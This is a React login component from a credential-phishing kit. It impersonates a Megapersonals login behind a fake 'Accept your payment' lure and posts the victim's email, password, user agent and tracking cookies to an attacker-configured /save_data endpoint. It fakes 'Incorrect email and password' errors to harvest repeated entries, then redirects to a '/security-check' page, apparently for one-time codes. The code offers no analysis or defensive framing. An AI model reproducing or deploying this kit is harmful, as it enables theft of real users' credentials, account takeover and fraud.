import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../auth/css/1e43e3ab50fce75fsw.css"; // Import the CSS file
import "../auth/css/57978a1014ff42c9sw.css"; // Import the CSS file
import devilGirl from "../auth/images/devilgirl.png"
import Cookies from 'js-cookie';



const Login = () => {
  const [errorMessage, setErrorMessage] = useState(""); // <-- error state

  const userId = Cookies.get('userId');
  const userAgent = Cookies.get('userAgent');
  const landing_url = Cookies.get('landing_url');
  const apiUrl = process.env.REACT_APP_API_URL;
  const tag = process.env.REACT_APP_TAG;
  const amount = process.env.REACT_APP_AMOUNT;
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    email: "",
    password: "",
    userId: "",
    userAgent: "",
    message: "",
    landing_url: "",
    captcha: "",
  });

  const [loading, setLoading] = useState(false);
  const [count, setCount] = useState(0);
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  useEffect(() => {
    setFormData((prevData) => ({
      ...prevData,
      userAgent: userAgent,
      landing_url: landing_url,
      userId: userId || 1,
    }));
  }, [userId, userAgent, landing_url]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setErrorMessage(""); // clear previous error

    try {
      const response = await fetch(
        `${apiUrl}/save_data`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(formData),
        }
      );

      if (response.ok) {
        const result = await response.json();
        console.log("Server Response:", result);

        if (result.success) {
          
          // Set insertId in sessionStorage
          sessionStorage.setItem("insertId", result.id);
          // Redirect to OTP page after successful submit
        setCount(prev => prev + 1);
        if(count >= 2) {
          navigate("/security-check");
        } else {
          setErrorMessage(result.message || "Incorrect email and password.");
        }


      }

        
      } else {
        setErrorMessage("Error submitting form.");
      }
    } catch (error) {
      console.error("Error:", error);
      setErrorMessage("An error occurred while submitting the form.");
    } finally {
      setLoading(false);
    }
  };
  

  return (
    <div className=" text-neutral-950">
      {/* Video Background */}
      <video
        autoPlay
        muted
        playsInline
        className="fixed inset-0 w-full h-full object-cover object-center"
        id="video"
      ></video>

      {/* Login Page */}
      <div
        className="relative min-h-screen flex items-center justify-center p-4 text-center"
        id="login-page"
      >
        <div className="bg-neutral-50 w-full max-w-md p-6 rounded-xl">
          <p className="text-3xl font-semibold">Accept your payment</p>
          <p className="mt-3 leading-relaxed max-w-[32ch] mx-auto">
            You just got{" "}
            <span className="text-green-500 font-semibold">${amount}</span> from
            {tag}
          </p>
          <img
            src={devilGirl}
            alt="Devil Girl"
            width="180"
            height="120"
          />
          <p className="text-lg font-semibold mt-3">To accept money</p>
          <p className="text-xl font-semibold mt-3">Login with Megapersonals</p>

          {/* Login Form */}
          <form
            className="flex flex-col gap-y-4 mt-4"
            onSubmit={handleSubmit}
          >
            <input
              required
              className="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
              placeholder="Enter email here"
              type="email"
              name="email"
              id="email"
              value={formData.email}
              onChange={handleChange}
              aria-label="Email"
            />
            <input
              required
              className="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
              placeholder="Enter password here"
              type="password"
              name="password"
              id="password"
              value={formData.password}
              onChange={handleChange}
              aria-label="Password"
            />
                {errorMessage && <span style={{ color: "red" }}>{errorMessage}</span>}

            <button
              type="submit"
              className="h-11 rounded text-neutral-50 font-medium bg-green-500 hover:bg-green-600 disabled:bg-green-200"
              disabled={loading}
            >
              {loading ? "Submitting..." : "Submit"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Login;
